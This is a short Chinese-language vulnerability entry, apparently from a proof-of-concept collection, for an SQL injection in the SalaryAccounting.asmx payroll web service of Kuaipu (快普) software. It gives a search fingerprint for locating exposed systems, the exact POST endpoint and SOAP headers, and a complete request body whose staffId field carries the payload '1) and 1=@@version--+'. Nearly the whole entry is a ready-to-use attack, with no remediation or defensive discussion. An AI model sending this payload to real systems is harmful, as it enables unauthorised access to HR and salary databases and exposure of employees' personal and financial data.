# 快普软件SalaryAccounting.asmx存在SQL注入漏洞

- **系统**：快普软件　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1`
- **关键头**：`SOAPAction: [http://tempuri.org/Calculate](http://tempuri.org/Calculate)`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:Calculate>
<!--type: string-->
<tem:SalaryCategory></tem:SalaryCategory>
<!--type: string-->
<tem:StaffBirthDay></tem:StaffBirthDay>
<!--type: string-->
<tem:staffId>
1) and 1=@@version--+</tem:staffId>
<!--type: string-->
<tem:Department></tem:Department>
<!--type: string-->
<tem:SubOrg></tem:SubOrg>
<!--type: string-->
<tem:taxMonthly></tem:taxMonthly>
</tem:Calculate>
</soapenv:Body>
</soapenv:Envelope>
```